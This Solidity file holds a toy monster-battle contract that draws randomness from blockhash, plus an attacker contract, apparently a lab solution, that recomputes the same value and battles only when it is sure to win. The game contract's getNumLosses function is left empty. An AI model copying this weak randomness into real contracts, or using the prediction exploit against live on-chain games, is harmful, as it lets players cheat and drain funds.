pragma solidity ^0.4.0;
contract EtheremonLite {
     struct Monster {
        uint weight;
        uint wins;
        uint losses;
        string name;
        bool created;
    }
    
    mapping(address => Monster) monsters;
    address Ogre;

    event battleOutcome(address chall, bool challWins);
    event monsterStats(address monsterAddress, uint wins, uint losses, string monsterName);
    event monsterCreated(string monsterName);
    
    constructor() public {
        Ogre = 0xfeed;
        monsters[Ogre].wins = 0;
        monsters[Ogre].losses = 0;
        monsters[Ogre].weight = 3;
        monsters[Ogre].name = "Fearsome Ogre";
        monsters[Ogre].created = true;
    }

    function initMonster(string _monsterName) public {
        monsters[msg.sender].wins = 0;
        monsters[msg.sender].losses = 0;
        monsters[msg.sender].weight = 1;
        monsters[msg.sender].name = _monsterName;
        monsters[msg.sender].created = true;
        emit monsterCreated(_monsterName);
    }
    
    
    function getName(address _monsterAddress) public view returns(string) {
        return monsters[_monsterAddress].name;
    }
    
    function getNumWins(address _monsterAddress) public view returns(uint) {
        return monsters[_monsterAddress].wins;
    }
    
    function getNumLosses(address _monsterAddress) public view returns(uint) {
    }
    
    function battle() public returns(uint256){
        address challenger = msg.sender;
        require(monsters[challenger].created  && monsters[Ogre].created);
        bool challengerWins = false;
        uint battleRatio = monsters[Ogre].weight / monsters[challenger].weight;
        uint dice = uint(blockhash(block.number - 1));
        dice = dice / 85; // Divide the dice by 85 to add obfuscation
        if (dice % battleRatio == 0) {
            monsters[challenger].wins += 1;
            monsters[Ogre].losses += 1;
            challengerWins = true;
        }
        else {
            monsters[challenger].losses += 1;
            monsters[Ogre].wins += 1;
        }
        emit battleOutcome(challenger, challengerWins);
    }
    
}


contract Winning{

    address montherAddress = 0xf3259eec5b4a46748a1f608ec3d74b89058bb3ad;

    function winning() public {
        EtheremonLite operation = EtheremonLite(montherAddress);
        operation.initMonster('dz336');
        uint dice = uint(blockhash(block.number - 1));
        dice = dice / 85;
        if (dice % 3 == 0) {
            operation.battle();
        }
    }

}